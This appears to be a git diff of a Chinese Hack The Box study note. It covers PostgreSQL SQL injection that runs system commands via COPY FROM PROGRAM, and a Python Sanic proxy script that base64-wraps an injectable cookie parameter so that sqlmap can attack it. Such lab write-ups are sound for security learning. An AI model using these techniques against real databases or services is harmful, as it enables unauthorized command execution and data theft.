@@ -3,11 +3,12 @@ title: HTB学习
 typora-root-url: ..
 date: 2022-07-18 19:27:49
 tags: HTB
+
 ---
 
 
 
-1. ## PostgreSQL  run command
+### 1.PostgreSQL  run command
 
 利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令
 
@@ -57,3 +58,46 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
 - 上传到 Arkime 进行分析
 
 ![image-20220718194335947](/assets/image-20220718194335947.png)
+
+
+
+### 5.sqlmap跑加密参数
+
+例如 `{"id": 20, "output":"dGVzdGFh"}` 在提交时必须整个字符串进行base64 编码再提交，其中 id 存在sql注入。
+
+可以写一个Python或者php脚本，对该请求进行封装
+
+例如
+
+```python
+from sanic import Sanic
+from sanic.response import text
+import requests
+import base64
+
+app = Sanic(__name__)
+@app.route("/")
+async def test(request):
+    a = '{"id": "'+str(request.args["a"][0])+'", "output": "a"}'
+    # print(a)
+    url = "http://142.93.37.65:30874/assets/jquery-3.6.0.slim.min.js"
+    payload = {}
+    cookie = '__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid='+(base64.b64encode(bytes(a.encode('utf-8')))).decode("utf-8")
+    # return text(cookie)
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Connection': 'keep-alive',
+        'Cookie': cookie
+    }
+
+    response = requests.request("POST", url, headers=headers, data=payload)
+
+    return text(response.text)
+
+app.run(host="0.0.0.0", port=8000, debug=False)
+
+```
+
+此时测试时只需要使用sqlmap 扫描该python脚本提供的接口
